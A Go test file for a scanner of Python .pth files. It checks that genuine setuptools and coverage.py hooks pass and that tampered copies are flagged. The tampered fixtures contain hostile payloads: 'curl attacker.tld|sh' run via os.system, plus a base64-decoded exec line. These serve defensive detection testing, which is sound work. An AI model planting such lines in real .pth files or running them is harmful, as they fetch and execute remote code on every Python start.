package pthscan_test

import (
	"testing"

	"github.com/stretchr/testify/require"

	"github.com/brynbellomy/veto/internal/pthscan"
)

// The fixtures below are byte-exact copies of files as they actually land in
// site-packages — including the trailing space setuptools emits. The
// pre-existing allowlist tests assert hand-written approximations of these
// shapes, which is why the divergence went unnoticed: the approximation
// matched the regex, the shipped file did not.
const (
	// setuptools >= 60, as installed by any current pip/uv.
	realSetuptoolsPrecedence = "import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); \n"

	// coverage.py's subprocess-support hook, shipped as a1_coverage.pth in
	// the coverage wheel (verified against coverage 7.15.3's RECORD).
	realCoverageHook = `import sys; exec('import os\n\nif os.getenv("COVERAGE_PROCESS_START") or os.getenv("COVERAGE_PROCESS_CONFIG"):\n try:\n  import coverage\n except:\n  pass\n else:\n  coverage.process_startup(slug="pth")')` + "\n"
)

// These two files are present in effectively every Python environment. A
// Critical verdict on either fail-closes every pip/uv/poetry/pdm install on
// the machine, so they are the highest-consequence false positives in the
// scanner.
func TestInspectAllowsRealWorldShippedPth(t *testing.T) {
	for _, tc := range []struct{ name, file, body string }{
		{"setuptools>=60 distutils-precedence", "distutils-precedence.pth", realSetuptoolsPrecedence},
		{"coverage.py subprocess hook", "a1_coverage.pth", realCoverageHook},
	} {
		t.Run(tc.name, func(t *testing.T) {
			v := pthscan.Inspect(pthscan.Input{PthContent: []byte(tc.body), FileName: tc.file})
			require.False(t, v.Flagged(), "false positive on shipped file: %v", codes(v))
			require.Equal(t, pthscan.SeverityNone, v.Severity)
		})
	}
}

// Widening the allowlist must not turn these well-known names into carriers.
// Each case rides a legit name and a legit-looking prefix but deviates in
// body, and must still be caught.
func TestInspectRealWorldAllowlistIsNotACarrier(t *testing.T) {
	for _, tc := range []struct{ name, file, body string }{
		{
			"setuptools shape with appended payload",
			"distutils-precedence.pth",
			"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_distutils_hack').add_shim(); __import__('os').system('curl attacker.tld|sh')\n",
		},
		{
			"setuptools shape importing a different module",
			"distutils-precedence.pth",
			"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'local'; enabled and __import__('_evil_hack').add_shim();\n",
		},
		{
			"setuptools shape with a non-local env comparison target",
			"distutils-precedence.pth",
			"import os; var = 'SETUPTOOLS_USE_DISTUTILS'; enabled = os.environ.get(var, 'local') == 'pwned'; enabled and __import__('_distutils_hack').add_shim();\n",
		},
		{
			"coverage shape with altered exec payload",
			"a1_coverage.pth",
			`import sys; exec('import os\n\nos.system("curl attacker.tld|sh")')` + "\n",
		},
		{
			"coverage line followed by a second payload line",
			"a1_coverage.pth",
			realCoverageHook + `import base64; exec(base64.b64decode('cHduZWQ='))` + "\n",
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			v := pthscan.Inspect(pthscan.Input{PthContent: []byte(tc.body), FileName: tc.file})
			require.True(t, v.Flagged(), "allowlist opened a hole for %q", tc.name)
			require.Equal(t, pthscan.SeverityCritical, v.Severity, "got %v", codes(v))
		})
	}
}
